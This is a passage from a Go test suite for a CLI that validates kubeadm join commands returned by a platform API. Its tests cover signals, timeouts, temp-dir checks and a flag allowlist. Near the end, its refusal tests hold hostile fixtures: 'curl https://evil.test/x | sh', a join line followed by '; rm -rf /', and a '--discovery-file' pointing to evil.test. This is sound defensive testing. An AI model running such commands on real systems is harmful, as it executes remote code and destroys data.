	mustNotContain(t, h.output(), "interrupted after the ticket was minted")
	if code != 129 {
		t.Errorf("exit code = %d, want 129 (128 + SIGHUP)", code)
	}
	mustLeaveNoJoinDir(t, h)
}

// A literal NUL byte inside the join line of the mint response (a byte,
// not a JSON escape): the body is not JSON, so there is no join command,
// as in the bash twin (mark-nul). Nothing runs.
func TestNodeJoinRefusesANULByteInTheMintResponse(t *testing.T) {
	s := defaultNodeStubs()
	s.mintBody = strings.Replace(stubMintBody, " --discovery-token-ca-cert-hash", "\x00 --discovery-token-ca-cert-hash", 1)
	h := nodeHarness(t, s, "hosted", "")
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "the platform accepted the mint but returned no join command this CLI could read")
	mustContain(t, h.output(), "lo kubehz node remove --name box-1")
	mustNotContain(t, h.output(), joinToken)
	if kubeadmJoin(h) != nil {
		t.Error("kubeadm join ran")
	}
	mustLeaveNoJoinDir(t, h)
}

// joinConfig reads the endpoint as the third word: a shorter line is
// refused (no token), not a panic, as the bash twin reads it.
func TestJoinConfigRefusesAShortLine(t *testing.T) {
	for _, line := range []string{"", "kubeadm", "kubeadm join", "kubeadm join cp.example.test:6443"} {
		h := newHarness(t)
		config, err := h.ctx.joinConfig(line, "v1beta4", "")
		if !errors.Is(err, ErrHandled) || config != "" {
			t.Errorf("%q: config %q, err %v; want a refusal", line, config, err)
		}
		mustContain(t, h.output(), "the join command must carry exactly one bootstrap token (--token).")
	}
}

// stubKubeadmRunner runs a shell script as `kubeadm join` (a real child
// process, through the runner of lo) and answers `kubeadm version` itself.
// Each other call fails.
type stubKubeadmRunner struct{ script string }

func (r stubKubeadmRunner) Run(ctx context.Context, c execx.Cmd) error {
	if c.Name != "kubeadm" {
		return errors.New(c.Name + ": not in this test")
	}
	if len(c.Args) > 0 && c.Args[0] == "version" {
		_, _ = io.WriteString(c.Stdout, "v1.36.0\n")
		return nil
	}
	c.Name = r.script
	return execx.NewRunner(nil).Run(ctx, c)
}

// writeKubeadmScript writes a stand-in for `kubeadm join` to dir/kubeadm:
// onInt is its trap on SIGINT (the signal the runner stops it with): an
// empty trap ignores it, "exit 0" ends with 0. It writes its pid to <script>.pid, the
// marker that it runs, and then runs for 20 seconds.
func writeKubeadmScript(t *testing.T, dir, onInt string) string {
	t.Helper()
	script := filepath.Join(dir, "kubeadm")
	body := "#!/bin/sh\ntrap '" + onInt + "' INT\necho $$ > \"$0.pid\"\n" +
		"i=0\nwhile [ \"$i\" -lt 400 ]; do sleep 0.05; i=$((i + 1)); done\n"
	if err := os.WriteFile(script, []byte(body), 0o700); err != nil { // #nosec G306 -- the stand-in runs as a program
		t.Fatal(err)
	}
	return script
}

// waitForLines waits (bound at most) for path to hold n lines or more.
func waitForLines(path string, n int, bound time.Duration) bool {
	for end := time.Now().Add(bound); time.Now().Before(end); time.Sleep(20 * time.Millisecond) {
		if b, err := os.ReadFile(path); err == nil && bytes.Count(b, []byte("\n")) >= n {
			return true
		}
	}
	return false
}

// readPid reads the pid that the stand-in wrote.
func readPid(t *testing.T, path string) int {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	pid, err := strconv.Atoi(strings.TrimSpace(string(b)))
	if err != nil {
		t.Fatal(err)
	}
	return pid
}

// mustBeGone fails when the process pid still runs.
func mustBeGone(t *testing.T, pid int) {
	t.Helper()
	if err := syscall.Kill(pid, 0); !errors.Is(err, syscall.ESRCH) {
		t.Errorf("the stand-in (pid %d) still runs after lo ended (%v)", pid, err)
		_ = syscall.Kill(pid, syscall.SIGKILL)
	}
}

// shortStopDelay makes joinStopDelay d for the test. Not parallel: the
// tests that call t.Parallel run after the others.
func shortStopDelay(t *testing.T, d time.Duration) {
	t.Helper()
	old := joinStopDelay
	joinStopDelay = d
	t.Cleanup(func() { joinStopDelay = old })
}

// runRealKubeadmJoin runs one join with the stand-in of onInt as kubeadm,
// cancels ctx once it runs, and returns the time from the start of the
// join, the pid of the stand-in, and the result.
func runRealKubeadmJoin(t *testing.T, h *harness, onInt string) (time.Duration, int, error) {
	t.Helper()
	script := writeKubeadmScript(t, t.TempDir(), onInt)
	h.ctx.Runner = stubKubeadmRunner{script: script}
	ctx, cancel := context.WithCancel(t.Context())
	defer cancel()
	go func() {
		if waitForLines(script+".pid", 1, 10*time.Second) {
			cancel()
		}
	}()
	start := time.Now()
	err := h.ctx.NodeJoin(ctx, "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", KubeletVersion: "v1.36.0"})
	return time.Since(start), readPid(t, script+".pid"), err
}

// A real kubeadm child that ignores the SIGINT of the stop: the runner
// kills it after joinStopDelay (here 300 ms). The config is removed, and
// the slot note goes out.
func TestNodeJoinStopKillsAKubeadmThatIgnoresTheInterrupt(t *testing.T) {
	shortStopDelay(t, 300*time.Millisecond)
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	took, pid, err := runRealKubeadmJoin(t, h, "")
	mustStopAfterTheMint(t, h, err)
	if took > 5*time.Second {
		t.Errorf("the join took %s; the stand-in runs 20 s, the stop bound is 300 ms", took)
	}
	mustBeGone(t, pid)
}

// A real kubeadm child that ends with 0 on the SIGINT of the stop: the
// join landed (the runner returns the error of ctx, the state tells), so
// the success text goes out and no slot note, as in the bash twin.
func TestNodeJoinAKubeadmThatEndsWithZeroOnTheStopLanded(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	_, pid, err := runRealKubeadmJoin(t, h, "exit 0")
	mustOK(t, err, h.output())
	mustContain(t, h.output(), "node 'box-1' joined cluster cl-1234abcd")
	mustNotContain(t, h.output(), "interrupted after the ticket was minted")
	mustLeaveNoJoinDir(t, h)
	mustBeGone(t, pid)
}

// stubKubeletRunner runs a shell script as `kubelet --version` (a real
// child process, through the runner of lo). Each other call fails: the
// tests that use it mint with --print-only, which runs no kubeadm.
type stubKubeletRunner struct{ script string }

func (r stubKubeletRunner) Run(ctx context.Context, c execx.Cmd) error {
	if c.Name != "kubelet" {
		return errors.New(c.Name + ": not in this test")
	}
	c.Name = r.script
	return execx.NewRunner(nil).Run(ctx, c)
}

// writeKubeletScript writes a stand-in for `kubelet --version` to
// dir/kubelet that ignores SIGINT and SIGTERM. It writes its pid to
// <script>.pid, the marker that it runs, and prints a version only after
// 20 seconds.
func writeKubeletScript(t *testing.T, dir string) string {
	t.Helper()
	script := filepath.Join(dir, "kubelet")
	body := "#!/bin/sh\ntrap '' INT TERM\necho $$ > \"$0.pid\"\n" +
		"i=0\nwhile [ \"$i\" -lt 400 ]; do sleep 0.05; i=$((i + 1)); done\necho 'Kubernetes v1.36.0'\n"
	if err := os.WriteFile(script, []byte(body), 0o700); err != nil { // #nosec G306 -- the stand-in runs as a program
		t.Fatal(err)
	}
	return script
}

// The version probe runs while the join holds the signals. A kubelet that
// ignores the SIGINT of the stop is killed after joinStopDelay (here
// 300 ms), as kubeadm is: the join ends with the mint note, prints no
// join line, and sends no mint.
func TestNodeJoinStopKillsAKubeletProbeThatIgnoresTheInterrupt(t *testing.T) {
	shortStopDelay(t, 300*time.Millisecond)
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.LookPath = func(tool string) bool { return tool == "kubelet" }
	script := writeKubeletScript(t, t.TempDir())
	h.ctx.Runner = stubKubeletRunner{script: script}
	ctx, cancel := context.WithCancel(t.Context())
	defer cancel()
	go func() {
		if waitForLines(script+".pid", 1, 10*time.Second) {
			cancel()
		}
	}()
	start := time.Now()
	err := h.ctx.NodeJoin(ctx, "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true})
	took := time.Since(start)
	if !errors.Is(err, ErrHandled) {
		t.Fatalf("err = %v, want ErrHandled; output:\n%s", err, h.output())
	}
	if took > 5*time.Second {
		t.Errorf("the join took %s; the stand-in runs 20 s, the stop bound is 300 ms", took)
	}
	mustContain(t, h.output(), "interrupted during the mint")
	mustNotContain(t, h.output(), "kubeadm join cp.example.test")
	h.mu.Lock()
	for _, r := range h.requests {
		if strings.HasSuffix(r.Path, "/join-token") {
			t.Errorf("the mint was sent: %s %s", r.Method, r.Path)
		}
	}
	h.mu.Unlock()
	mustBeGone(t, readPid(t, script+".pid"))
}

// A mint that gets no answer ends after mintMaxTime (here 200 ms), as
// curl --max-time ends it in the bash twin: the api is unreachable,
// nothing is printed or run, and there is no note of a signal. The bound
// is 150 s, the bound of the bash twin (kubehz::space_api_mint_max_time).
func TestNodeJoinMintWithoutAnAnswerEndsAfterItsBound(t *testing.T) {
	old := mintMaxTime
	if old != 150*time.Second {
		t.Errorf("mintMaxTime = %s, want 150s (the bash twin)", old)
	}
	mintMaxTime = 200 * time.Millisecond
	t.Cleanup(func() { mintMaxTime = old })
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.handleFunc("POST /api/clusters/cl-1234abcd/nodes/join-token", func(w http.ResponseWriter, r *http.Request) {
		select {
		case <-r.Context().Done():
		case <-time.After(10 * time.Second):
		}
		w.WriteHeader(http.StatusGatewayTimeout)
	})
	start := time.Now()
	err := h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true})
	took := time.Since(start)
	if !errors.Is(err, ErrHandled) {
		t.Fatalf("err = %v, want ErrHandled; output:\n%s", err, h.output())
	}
	if took > 5*time.Second {
		t.Errorf("the join took %s; the stub answers after 10 s, the bound is 200 ms", took)
	}
	mustContain(t, h.output(), "kubehz API unreachable (POST /api/clusters/cl-1234abcd/nodes/join-token)")
	mustNotContain(t, h.output(), "interrupted")
	mustNotContain(t, h.output(), "kubeadm join cp.example.test")
}

// joinHelperEnv names the directory of TestNodeJoinHelperProcess; only
// TestNodeJoinRepeatedSignalsEndTheJoinCleanly sets it.
const joinHelperEnv = "LOK8S_TEST_JOIN_HELPER_DIR"

// TestNodeJoinHelperProcess is the lo process of
// TestNodeJoinRepeatedSignalsEndTheJoinCleanly (the test binary, run
// again): a signal that takes its default action there ends that process,
// not the test run. It runs one join with the stand-in in its directory
// as kubeadm and a stop bound of 500 ms. It writes the marker "cancelled"
// when the Watch (or the catch of a SIGHUP) has cancelled the command
// context: both stop their catch before they cancel. It writes its output
// to "out" and exits with the code of the Watch (main ends a SIGHUP run
// with the SIGHUP itself, through interrupt.Exit).
func TestNodeJoinHelperProcess(t *testing.T) {
	dir := os.Getenv(joinHelperEnv)
	if dir == "" {
		t.Skip("the lo process of TestNodeJoinRepeatedSignalsEndTheJoinCleanly")
	}
	joinStopDelay = 500 * time.Millisecond
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.env["TMPDIR"] = filepath.Join(dir, "tmp")
	h.ctx.Runner = stubKubeadmRunner{script: filepath.Join(dir, "kubeadm")}
	ctx, exitCode := interrupt.Watch(context.Background())
	go func() {
		<-ctx.Done()
		_ = os.WriteFile(filepath.Join(dir, "cancelled"), []byte("cancelled\n"), 0o600)
	}()
	_ = h.ctx.NodeJoin(ctx, "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", KubeletVersion: "v1.36.0"})
	code := exitCode()
	_ = os.WriteFile(filepath.Join(dir, "out"), []byte(h.output()), 0o600)
	os.Exit(code)
}

// Signals to lo (a process of its own) during a join, with a kubeadm that
// ignores SIGINT. A Ctrl-C signals the process group: lo and kubeadm get
// the INT. A second signal comes after the first one has stopped the
// Watch (or the catch of a SIGHUP): the helper writes the marker then.
// Without the hold of the join, that signal takes its default action and
// ends lo before kubeadm is stopped and the config is removed. lo ends
// within the bound of the stop with 128 + the signal, and the slot note.
func TestNodeJoinRepeatedSignalsEndTheJoinCleanly(t *testing.T) {
	for _, tc := range []struct {
		name  string
		sigs  []syscall.Signal
		group bool
		want  int
	}{
		{"an INT to the group", []syscall.Signal{syscall.SIGINT}, true, 130},
		{"two INTs to the group", []syscall.Signal{syscall.SIGINT, syscall.SIGINT}, true, 130},
		{"two TERMs", []syscall.Signal{syscall.SIGTERM, syscall.SIGTERM}, false, 143},
		{"two HUPs", []syscall.Signal{syscall.SIGHUP, syscall.SIGHUP}, false, 129},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if tc.sigs[0] == syscall.SIGHUP && signal.Ignored(syscall.SIGHUP) {
				t.Skip("SIGHUP is ignored here (nohup): the catch does nothing then")
			}
			dir := t.TempDir()
			for _, d := range []string{"tmp", "proc"} {
				if err := os.Mkdir(filepath.Join(dir, d), 0o700); err != nil {
					t.Fatal(err)
				}
			}
			script := writeKubeadmScript(t, dir, "")
			cmd := exec.Command(os.Args[0], "-test.run=^TestNodeJoinHelperProcess$", "-test.count=1") // #nosec G204 -- the test binary itself
			cmd.Env = append(os.Environ(), joinHelperEnv+"="+dir, "TMPDIR="+filepath.Join(dir, "proc"))
			cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
			var out bytes.Buffer
			cmd.Stdout, cmd.Stderr = &out, &out
			if err := cmd.Start(); err != nil {
				t.Fatal(err)
			}
			lo := cmd.Process.Pid
			t.Cleanup(func() { _ = syscall.Kill(-lo, syscall.SIGKILL) })
			done := make(chan error, 1)
			go func() { done <- cmd.Wait() }()
			if !waitForLines(script+".pid", 1, 10*time.Second) {
				t.Fatalf("kubeadm did not start; lo said:\n%s", out.String())
			}
			pid := readPid(t, script+".pid")
			t.Cleanup(func() { _ = syscall.Kill(pid, syscall.SIGKILL) })
			target := lo
			if tc.group {
				target = -lo
			}
			start := time.Now()
			for i, s := range tc.sigs {
				if i > 0 && !waitForLines(filepath.Join(dir, "cancelled"), 1, 5*time.Second) {
					t.Fatalf("the first %s did not cancel the join; lo said:\n%s", tc.sigs[0], out.String())
				}
				if err := syscall.Kill(target, s); err != nil {
					t.Fatal(err)
				}
			}
			select {
			case <-done:
			case <-time.After(10 * time.Second):
				t.Fatalf("lo did not end within 10 s; it said:\n%s", out.String())
			}
			if code := cmd.ProcessState.ExitCode(); code != tc.want {
				t.Errorf("lo ended with %d (%s), want %d; it said:\n%s", code, cmd.ProcessState, tc.want, out.String())
			}
			if took := time.Since(start); took > 5*time.Second {
				t.Errorf("lo ended %s after the first signal; the stop bound is 500 ms", took)
			}
			mustBeGone(t, pid)
			entries, err := os.ReadDir(filepath.Join(dir, "tmp"))
			if err != nil {
				t.Fatal(err)
			}
			for _, e := range entries {
				t.Errorf("left in the temp dir: %s", e.Name())
			}
			said, _ := os.ReadFile(filepath.Join(dir, "out"))
			mustContain(t, string(said), "interrupted after the ticket was minted")
			mustContain(t, string(said), "lo kubehz node remove --name box-1")
		})
	}
}

// No refusal prints a word of the line: a word can hold a ticket. A token
// after a flag this CLI does not run, and a token as a word that follows
// no flag.
func TestNodeJoinRefusalsPrintNoWordOfTheLine(t *testing.T) {
	const otherToken = "z9y8x7" + "." + "w6v5u4t3s2r1q0p9"
	const head = "kubeadm join cp.example.test:6443 --token " + joinToken + " --discovery-token-ca-cert-hash " + caPin
	for line, want := range map[string]string{
		head + " --node-name box-1 --tls-bootstrap-token " + otherToken: "kubehz: word 10 of the join command is a flag this CLI will not run.\n",
		head + " " + otherToken + " --node-name box-1":                  "kubehz: word 8 of the join command follows no flag.\n",
	} {
		h := joinWithMint(t, `{"ok":true,"data":{"joinCommand":"`+line+`","expiresAt":"x","ready":true}}`)
		mustContain(t, h.output(), want)
		mustContain(t, h.output(), "holds a node slot")
		for _, word := range []string{otherToken, joinToken, "--tls-bootstrap-token"} {
			mustNotContain(t, h.output(), word)
		}
	}
}

// A control character in the line (a newline at the end or inside, CR,
// NUL, tab, DEL) is refused as the response is read, with the text of the
// bash twin: one mint, nothing runs, no file.
func TestNodeJoinRefusesAControlCharacterInTheLine(t *testing.T) {
	const line = "kubeadm join cp.example.test:6443 --token " + joinToken + " --discovery-token-ca-cert-hash " + caPin + " --node-name box-1"
	for name, bad := range map[string]string{
		"a trailing newline":  line + "\n",
		"an embedded newline": strings.Replace(line, " --node-name", "\n--node-name", 1),
		"a CR":                line + "\r",
		"a NUL":               strings.Replace(line, " --node-name", "\x00 --node-name", 1),
		"a tab":               strings.Replace(line, " --node-name", "\t--node-name", 1),
		"a DEL":               line + "\x7f",
		// Before the check of the first two words too.
		"a tab after kubeadm": strings.Replace(line, "kubeadm join", "kubeadm\tjoin", 1),
	} {
		t.Run(name, func(t *testing.T) {
			js, err := json.Marshal(bad)
			if err != nil {
				t.Fatal(err)
			}
			h := joinWithMint(t, `{"ok":true,"data":{"joinCommand":`+string(js)+`,"expiresAt":"x","ready":true}}`)
			mustContain(t, h.output(), "kubehz: the join command carries characters this CLI does not run.\n")
			mustContain(t, h.output(), "holds a node slot")
			mustNotContain(t, h.output(), joinToken)
			mints := 0
			for _, r := range h.reqs() {
				if r.Method == "POST" && strings.HasSuffix(r.Path, "/join-token") {
					mints++
				}
			}
			if mints != 1 {
				t.Errorf("minted %d times, want 1", mints)
			}
			mustLeaveNoJoinDir(t, h)
		})
	}
}

// --print-only reads the line as strictly as a join, first: a line that
// fails the read prints no command.
func TestNodeJoinPrintOnlyRefusesALineItCannotRead(t *testing.T) {
	s := defaultNodeStubs()
	s.mintBody = `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token ` + joinToken + ` --discovery-token-ca-cert-hash ` + caPin + ` stray --node-name box-1","expiresAt":"x","ready":true}}`
	h := nodeHarness(t, s, "hosted", "")
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true}))
	mustContain(t, h.output(), "kubehz: word 8 of the join command follows no flag.\n")
	mustContain(t, h.output(), "holds a node slot")
	mustNotContain(t, h.output(), "kubeadm join cp")
	mustNotContain(t, h.output(), joinToken)
	if n := kubeadmCalls(h); n != 0 {
		t.Fatalf("kubeadm ran %d times, want 0", n)
	}
}

// Each flag of nodeJoinAllowedFlags reads into the config: a flag that is
// added to the allowlist and not to joinConfig fails here.
func TestNodeJoinConfigReadsEveryAllowedFlag(t *testing.T) {
	values := map[string]string{"--token": joinToken, "--discovery-token-ca-cert-hash": caPin, "--node-name": "box-1"}
	line := "kubeadm join cp.example.test:6443"
	for _, flag := range nodeJoinAllowedFlags {
		v, ok := values[flag]
		if !ok {
			t.Fatalf("no test value for the allowed flag %s: add one here", flag)
		}
		line += " " + flag + " " + v
	}
	h := newHarness(t)
	mustOK(t, h.ctx.AssertJoinCommand(line), h.output())
	config, err := h.ctx.joinConfig(line, "v1beta4", "")
	mustOK(t, err, h.output())
	for _, flag := range nodeJoinAllowedFlags {
		mustContain(t, config, `"`+values[flag]+`"`)
	}
}

// A removal that fails after the join names the directory, which holds
// the ticket.
func TestNodeJoinNamesAConfigDirItCannotRemove(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	seen := fakeKubeadm(h, "v1.36.0\n", nil)
	var removed []string
	h.ctx.Remove = func(p string) error {
		removed = append(removed, p)
		if p == seen.path {
			return os.Remove(p)
		}
		return errors.New("device busy")
	}
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}), h.output())
	mustContain(t, h.output(), "could not remove "+filepath.Dir(seen.path)+"\n")
	mustContain(t, h.output(), "It holds the join ticket until the ticket expires.")
	// The file, then the directory (rm -f, then rmdir, as the bash twin):
	// never a removal of the whole tree.
	if want := []string{seen.path, filepath.Dir(seen.path)}; !slices.Equal(removed, want) {
		t.Errorf("removed %q, want %q", removed, want)
	}
}

// A directory that holds more than the config stays, with the warning:
// the removal takes the file and then the empty directory only.
func TestNodeJoinLeavesAConfigDirThatHoldsMore(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	seen := fakeKubeadm(h, "v1.36.0\n", nil)
	inner := h.runner.handler
	var other string
	h.runner.handler = func(c execx.Cmd, stdin string) error {
		err := inner(c, stdin)
		if len(c.Args) == 3 && c.Args[0] == "join" {
			other = filepath.Join(filepath.Dir(c.Args[2]), "other")
			if werr := os.WriteFile(other, []byte("x"), 0o600); werr != nil {
				t.Fatal(werr)
			}
		}
		return err
	}
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}), h.output())
	mustContain(t, h.output(), "could not remove "+filepath.Dir(seen.path)+"\n")
	if _, err := os.Lstat(seen.path); !os.IsNotExist(err) {
		t.Errorf("the config is still there: %v", err)
	}
	if _, err := os.Lstat(other); err != nil {
		t.Errorf("the other file is gone: %v", err)
	}
}

// --node-ip goes into the config: a value outside the address shape is
// refused before the mint, with --print-only too.
func TestNodeJoinRefusesABadNodeIP(t *testing.T) {
	for _, ip := range []string{"203.0.113.7 --control-plane", "203.0.113.7\nkind: x", "203.0.113.7,", `"x"`, "a,b,c"} {
		for _, printOnly := range []bool{false, true} {
			h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
			mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", NodeIP: ip, PrintOnly: printOnly}))
			mustContain(t, h.output(), "--node-ip must be one IP address, or an IPv4 and an IPv6 address with a comma")
			if h.anyReq("POST", "/join-token") || kubeadmCalls(h) != 0 {
				t.Errorf("node ip %q: minted or ran kubeadm", ip)
			}
		}
	}
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	seen := fakeKubeadm(h, "v1.36.0\n", nil)
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", NodeIP: "203.0.113.7,2001:db8::7"}), h.output())
	mustContain(t, seen.content, "      value: \"203.0.113.7,2001:db8::7\"\n")
}

// A temp dir that fails the check is refused before the mint: the config
// could not be written after it.
func TestNodeJoinRefusesAnOpenTempDirBeforeTheMint(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	open := filepath.Join(h.base, "open")
	if err := os.Mkdir(open, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(open, 0o777); err != nil {
		t.Fatal(err)
	}
	h.env["TMPDIR"] = open
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "is writable by others and has no sticky bit")
	if h.anyReq("POST", "/join-token") || kubeadmJoin(h) != nil {
		t.Error("minted or joined with an open temp dir")
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.env["TMPDIR"] = filepath.Join(h.base, "missing")
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "the temp dir (TMPDIR) cannot be resolved, so the join config cannot be written.")
	if h.anyReq("POST", "/join-token") {
		t.Error("minted with a temp dir that cannot be resolved")
	}
}

// A failed write after the mint names the slot, and runs no join.
func TestNodeJoinConfigWriteFailure(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.joinWrite = func(*os.File, string) error { return errors.New("disk full") }
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "could not write the join config for 'box-1': disk full")
	mustContain(t, h.output(), "lo kubehz node remove --name box-1")
	if kubeadmJoin(h) != nil {
		t.Error("joined without a config")
	}
	mustLeaveNoJoinDir(t, h)

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.joinWrite = func(*os.File, string) error { return errors.New("disk full") }
	h.ctx.Remove = func(string) error { return errors.New("device busy") }
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "The cleanup failed too: ")
	mustContain(t, h.output(), "may still hold the join ticket. Delete that directory.")
}

// The line is read into the config after the mint; a line this CLI cannot
// read that way runs nothing, names the slot and writes no file.
func TestNodeJoinRefusesALineItCannotReadIntoAConfig(t *testing.T) {
	const ca = " --discovery-token-ca-cert-hash " + caPin
	for line, want := range map[string]string{
		"kubeadm join cp.example.test:6443" + ca + " --node-name box-1":                                                  "exactly one bootstrap token (--token)",
		"kubeadm join cp.example.test:6443 --token " + joinToken + " --token " + joinToken[:len(joinToken)-1] + "2" + ca: "exactly one bootstrap token (--token)",
		"kubeadm join cp.example.test:6443 --token A1B2C3.D4E5F6G7H8I9J0K1" + ca:                                         "does not have the kubeadm token shape",
		"kubeadm join cp.example.test:6443 --token " + joinToken + ca + " --node-name a --node-name=b":                   "names the node more than once (--node-name)",
		"kubeadm join cp.example.test:6443 extra --token " + joinToken + ca:                                              "kubehz: word 4 of the join command follows no flag.\n",
		"kubeadm join cp.example.test:6443 --token= " + joinToken + ca:                                                   "kubehz: word 4 of the join command is a flag without a value.\n",
		"kubeadm join cp.example.test:6443 --token " + joinToken + ca + " --node-name":                                   "kubehz: word 8 of the join command is a flag without a value.\n",
		"kubeadm join cp.example.test:6443 --token" + ca:                                                                 "kubehz: word 4 of the join command is a flag without a value.\n",
		// The CA pin: sha256: and 64 hex digits, as kubeadm reads it.
		"kubeadm join cp.example.test:6443 --token " + joinToken + " --discovery-token-ca-cert-hash sha256:1111":                       "kubehz: word 6 of the join command is a CA pin that is not sha256: and 64 hex digits.\n",
		"kubeadm join cp.example.test:6443 --token " + joinToken + " --discovery-token-ca-cert-hash " + caPin + "0":                    "kubehz: word 6 of the join command is a CA pin that is not sha256: and 64 hex digits.\n",
		"kubeadm join cp.example.test:6443 --token " + joinToken + " --discovery-token-ca-cert-hash " + caPin[:70] + " " + caPin[70:]:  "kubehz: word 6 of the join command is a CA pin that is not sha256: and 64 hex digits.\n",
		"kubeadm join cp.example.test:6443 --token " + joinToken + " --discovery-token-ca-cert-hash SHA256:" + caPin[7:]:               "kubehz: word 6 of the join command is a CA pin that is not sha256: and 64 hex digits.\n",
		"kubeadm join cp.example.test:6443 --token " + joinToken + " --discovery-token-ca-cert-hash " + caPin + ca + "x":               "kubehz: word 8 of the join command is a CA pin that is not sha256: and 64 hex digits.\n",
		"kubeadm join cp.example.test:6443 --token " + joinToken + " --discovery-token-ca-cert-hash " + caPin[:70] + `\"` + caPin[71:]: "kubehz: the join command carries characters this CLI does not run.\n",
	} {
		s := defaultNodeStubs()
		s.mintBody = `{"ok":true,"data":{"joinCommand":"` + line + `","expiresAt":"x","ready":true}}`
		h := nodeHarness(t, s, "hosted", "")
		mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
		mustContain(t, h.output(), want)
		mustContain(t, h.output(), "holds a node slot")
		if kubeadmJoin(h) != nil {
			t.Errorf("%q: joined", line)
		}
		mustLeaveNoJoinDir(t, h)
	}
	// The --flag=value form and a second CA pin read the same way.
	s := defaultNodeStubs()
	s.mintBody = `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token=` + joinToken + ` --discovery-token-ca-cert-hash=` + caPin + ` --discovery-token-ca-cert-hash ` + caPin2 + `","expiresAt":"x","ready":true}}`
	h := nodeHarness(t, s, "hosted", "")
	seen := fakeKubeadm(h, "v1.36.0\n", nil)
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}), h.output())
	mustJoinWithConfig(t, h, seen, `apiVersion: kubeadm.k8s.io/v1beta4
kind: JoinConfiguration
discovery:
  bootstrapToken:
    apiServerEndpoint: "cp.example.test:6443"
    token: "`+joinToken+`"
    caCertHashes:
      - "`+caPin+`"
      - "`+caPin2+`"
`)
}

func TestNodeJoinUnarmedTicketWarns(t *testing.T) {
	s := defaultNodeStubs()
	s.mintBody = `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token ` + joinToken + ` --discovery-token-ca-cert-hash ` + caPin + ` --node-name box-1","expiresAt":"2026-09-01T12:00:00Z","ready":false}}`
	h := nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}), h.output())
	mustContain(t, h.output(), "has not armed this ticket yet")
}

// ── the safety gate ──────────────────────────────────────

func joinWithMint(t *testing.T, mint string) *harness {
	s := defaultNodeStubs()
	s.mintBody = mint
	h := nodeHarness(t, s, "hosted", "")
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	if kubeadmJoin(h) != nil {
		t.Fatal("nothing may run")
	}
	return h
}

func TestNodeJoinRefusesNonJoinLines(t *testing.T) {
	h := joinWithMint(t, `{"ok":true,"data":{"joinCommand":"curl https://evil.test/x | sh","expiresAt":"x","ready":true}}`)
	mustContain(t, h.output(), "a command this CLI does not run")
	h = joinWithMint(t, `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1; rm -rf /","expiresAt":"x","ready":true}}`)
	mustContain(t, h.output(), "characters this CLI does not run")
}

func TestAssertJoinCommandFlagAllowlist(t *testing.T) {
	cases := map[string]string{
		"--discovery-file":  "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash " + caPin + " --discovery-file https://evil.test/kubeconfig --node-name box-1",
		"--config":          "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash " + caPin + " --config=/tmp/kubeadm.conf --node-name box-1",
		"--control-plane":   "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash " + caPin + " --control-plane --node-name box-1",
		"--certificate-key": "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash " + caPin + " --certificate-key deadbeef --node-name box-1",
